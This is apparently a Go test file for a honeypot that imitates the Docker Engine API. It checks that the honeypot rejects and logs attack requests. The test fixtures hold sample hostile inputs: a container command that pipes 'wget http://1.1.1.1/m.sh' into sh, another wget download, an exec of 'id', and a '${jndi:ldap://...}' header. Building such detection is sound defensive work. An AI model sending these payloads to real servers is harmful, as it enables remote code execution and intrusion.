package trap

import (
	"encoding/json"
	"strings"
	"testing"
	"unicode/utf8"
)

func TestDockerRequests(t *testing.T) {
	t.Parallel()
	create := `{"Image":"alpine","Cmd":["sh","-c","wget http://1.1.1.1/m.sh -O- | sh"]}`
	cases := []struct {
		name       string
		method     string
		path       string
		body       string
		status     int
		attack     bool
		wantBody   string
		wantMetaIn []string
	}{
		{name: "ping", method: "GET", path: "/_ping", status: 200, wantBody: "OK"},
		{name: "version", method: "GET", path: "/version", status: 200, wantBody: `"ApiVersion":"1.43"`},
		{name: "versioned version", method: "GET", path: "/v1.43/version", status: 200, wantBody: `"Os":"linux"`},
		{name: "info", method: "GET", path: "/info", status: 200, wantBody: `"OSType":"linux"`},
		{name: "containers", method: "GET", path: "/containers/json", status: 200, wantBody: "[]"},
		{name: "images", method: "GET", path: "/v1.41/images/json", status: 200, wantBody: "[]"},
		{name: "unknown", method: "GET", path: "/nothing/here", status: 404, wantBody: "page not found"},
		{name: "version prefix only", method: "GET", path: "/v1.43", status: 404},
		{name: "create", method: "POST", path: "/containers/create", body: create, status: 403, attack: true, wantMetaIn: []string{"alpine", "wget"}},
		{name: "create versioned", method: "POST", path: "/v1.41/containers/create?name=x", body: create, status: 403, attack: true, wantMetaIn: []string{"alpine", "wget"}},
		{name: "exec", method: "POST", path: "/containers/abc123/exec", body: `{"Cmd":["id"],"AttachStdout":true}`, status: 403, attack: true, wantMetaIn: []string{"exec", "id"}},
		{name: "cmd as string", method: "POST", path: "/containers/create", body: `{"Image":"busybox","Cmd":"id"}`, status: 403, attack: true, wantMetaIn: []string{"busybox", "id"}},
		{name: "malformed body", method: "POST", path: "/containers/create", body: `{"Image":`, status: 403, attack: true},
		{name: "image pull", method: "POST", path: "/images/create?fromImage=evil", status: 403, attack: true},
		{name: "delete", method: "DELETE", path: "/containers/abc", status: 403, attack: true},
		{name: "unknown post", method: "POST", path: "/other", status: 404, attack: true},
		{name: "get with body", method: "GET", path: "/version", body: `{"a":1}`, status: 200, attack: true},
		{name: "oversized body", method: "POST", path: "/containers/create", body: `{"Image":"` + strings.Repeat("a", 40000) + `"}`, status: 403, attack: true},
		{name: "long path", method: "POST", path: "/" + strings.Repeat("p", 2000), status: 404, attack: true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			h := startDocker(t)
			res := stubDo(t, h.addr, tc.method, tc.path, map[string]string{"User-Agent": "scanner/1.0"}, tc.body)
			if res.status != tc.status {
				t.Errorf("status = %d, want %d (%s)", res.status, tc.status, res.body)
			}
			if tc.wantBody != "" && !strings.Contains(res.body, tc.wantBody) {
				t.Errorf("body = %q, want it to contain %q", res.body, tc.wantBody)
			}
			if tc.path != "/_ping" && !json.Valid([]byte(res.body)) {
				t.Errorf("body is not JSON: %q", res.body)
			}
			ev := h.waitClass(t, tc.attack)
			if !tc.attack {
				return
			}
			if ev.Info.SourceIP != "127.0.0.1" {
				t.Errorf("source ip = %q, want the socket peer", ev.Info.SourceIP)
			}
			for k, v := range ev.Meta {
				if len(v) > maxHTTPValue || !utf8.ValidString(v) {
					t.Errorf("meta %s is %d bytes (valid utf8: %v), want <= %d", k, len(v), utf8.ValidString(v), maxHTTPValue)
				}
			}
			for _, want := range tc.wantMetaIn {
				if !strings.Contains(ev.Meta["command"], want) {
					t.Errorf("command meta %q lacks %q", ev.Meta["command"], want)
				}
			}
			if ev.Info.Commands == 0 && ev.Info.PayloadBytes == 0 {
				t.Errorf("attack without command or payload: %+v", ev.Info)
			}
		})
	}
}

func TestDockerCreateLogsCommandWithImage(t *testing.T) {
	t.Parallel()
	h := startDocker(t)
	stubDo(t, h.addr, "POST", "/containers/create", nil, `{"Image":"alpine","Cmd":["wget","http://8.8.8.8/x"]}`)
	ev := waitAttack(t, h.sink)
	if ev.Info.Commands != 1 || ev.Meta["image"] != "alpine" || !strings.HasPrefix(ev.Meta["command"], "docker create image=alpine cmd=wget http://8.8.8.8/x") {
		t.Errorf("event = %+v", ev)
	}
	out := h.logs.String()
	if !strings.Contains(out, `"action":"command"`) || !strings.Contains(out, "alpine") {
		t.Errorf("command not logged:\n%s", out)
	}
}

func TestDockerSpoofedHeadersAndNoSecrets(t *testing.T) {
	t.Parallel()
	h := startDocker(t)
	stubDo(t, h.addr, "POST", "/containers/create", map[string]string{
		"X-Forwarded-For": "8.8.8.8",
		"X-Real-IP":       "1.1.1.1",
		"Authorization":   "Bearer topsecrettoken",
		"Cookie":          "sid=topsecretcookie",
	}, `{"Image":"alpine"}`)
	ev := waitAttack(t, h.sink)
	if ev.Info.SourceIP != "127.0.0.1" {
		t.Errorf("alert ip = %q, want the socket peer", ev.Info.SourceIP)
	}
	for k, v := range ev.Meta {
		for _, bad := range []string{"8.8.8.8", "1.1.1.1", "topsecret"} {
			if strings.Contains(v, bad) {
				t.Errorf("meta %s=%q contains %q", k, v, bad)
			}
		}
	}
	if out := h.logs.String(); strings.Contains(out, "topsecret") {
		t.Errorf("log leaks a secret:\n%s", out)
	}
}

func TestDockerJNDIHeaderIsCommand(t *testing.T) {
	t.Parallel()
	h := startDocker(t)
	stubDo(t, h.addr, "GET", "/version", map[string]string{"User-Agent": "${jndi:ldap://x/a}"}, "")
	waitAttack(t, h.sink)
}

func TestDockerStopClosesConnections(t *testing.T) {
	t.Parallel()
	h := startDocker(t)
	assertStopClosesConnections(t, h, "GET /_ping HTTP/1.1\r\nHost: x\r\n\r\n")
}

func TestDockerRoute(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"/version":                    "/version",
		"/v1.43/version":              "/version",
		"/v1.43":                      "/",
		"/v1.43/":                     "/",
		"/v1.43x/version":             "/v1.43x/version",
		"//containers//json":          "/containers/json",
		"/containers/../containers/x": "/containers/x",
		"/v9.99/containers/create":    "/containers/create",
	}
	for in, want := range cases {
		if got := dockerRoute(in); got != want {
			t.Errorf("dockerRoute(%q) = %q, want %q", in, got, want)
		}
	}
	if got := dockerRoute(strings.Repeat("a", maxHTTPPath+1)); got != "/" {
		t.Errorf("long path routed to %q", got)
	}
}

func TestParseDockerBody(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name, body, image, cmd string
	}{
		{"list", `{"Image":"alpine","Cmd":["a","b"]}`, "alpine", "a b"},
		{"string", `{"Image":"x","Cmd":"id"}`, "x", "id"},
		{"entrypoint", `{"Image":"x","Entrypoint":["sh","-c"],"Cmd":["id"]}`, "x", "sh -c id"},
		{"mixed types", `{"Cmd":["a",1,null,"b"]}`, "", "a b"},
		{"invalid", `{`, "", ""},
		{"wrong shape", `[1,2]`, "", ""},
		{"empty", ``, "", ""},
	}
	for _, tc := range cases {
		image, cmd := parseDockerBody([]byte(tc.body))
		if image != tc.image || cmd != tc.cmd {
			t.Errorf("%s: got (%q, %q), want (%q, %q)", tc.name, image, cmd, tc.image, tc.cmd)
		}
	}
	many := `{"Cmd":[` + strings.Repeat(`"abcdefghij",`, 1000) + `"z"]}`
	_, cmd := parseDockerBody([]byte(many))
	if len(cmd) > maxDockerCmdBytes+maxHTTPBody {
		t.Errorf("cmd of %d bytes is not bounded", len(cmd))
	}
	if n := strings.Count(cmd, " ") + 1; n > maxDockerCmdItems {
		t.Errorf("%d words, want <= %d", n, maxDockerCmdItems)
	}
}
